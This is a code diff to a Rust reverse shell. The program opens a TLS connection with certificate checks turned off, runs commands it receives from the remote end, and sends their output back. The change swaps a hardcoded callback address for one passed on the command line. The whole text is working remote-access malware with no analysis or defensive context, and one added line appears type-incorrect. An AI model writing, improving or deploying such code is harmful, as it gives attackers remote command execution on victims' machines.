@@ -1,21 +1,26 @@
 use std::io::{Read, Write};
 use std::net;
-use std::net::{Ipv4Addr, TcpStream, SocketAddr};
+use std::net::{Ipv4Addr, IpAddr, TcpStream, SocketAddr, ToSocketAddrs};
 use std::process::{Command, Stdio};
 use std::str;
 use std::thread;
 use std::path::Path;
 use openssl::ssl::{SslMethod, SslConnector};
 use std::ffi::OsStr;
+use std::env;
 
 fn main() {
     let mut build = SslConnector::builder(SslMethod::tls()).unwrap();
     build.set_verify(openssl::ssl::SslVerifyMode::NONE);
     let connector = build.build();
-	let addr = Ipv4Addr::from(0xcafebabe);
-	let sockettest = SocketAddr::from((addr,0xceec));
-	let convertsocket = sockettest.to_string();
-	let convertip = addr.to_string();
+	let args: Vec<String> = env::args().collect();
+	let ip = &args[1];
+	let mut addrs_iter = ip.to_socket_addrs().unwrap();
+	let sockettest = addrs_iter.next(); 
+	let convertsocket = ip;
+	let iponly:Vec<String>=vec!(ip.split(':').collect());
+	let convertip = &iponly[0];
+
     let stream = TcpStream::connect(&convertsocket).unwrap();
     let mut stream = connector.connect(&convertip,stream).unwrap();
     loop {
@@ -51,7 +56,7 @@ fn main() {
                     .arg(osstr4.clone())
                     .arg(string5[0])
                     .args(&string5[1..])
-                    .stdin(fp1.stdout.expect("Command failed"))
+                    .stdin(fp1.stdout.expect("The Command has failed"))
                     .output()
                 {
                     stream.write_all(&fp2.stdout);
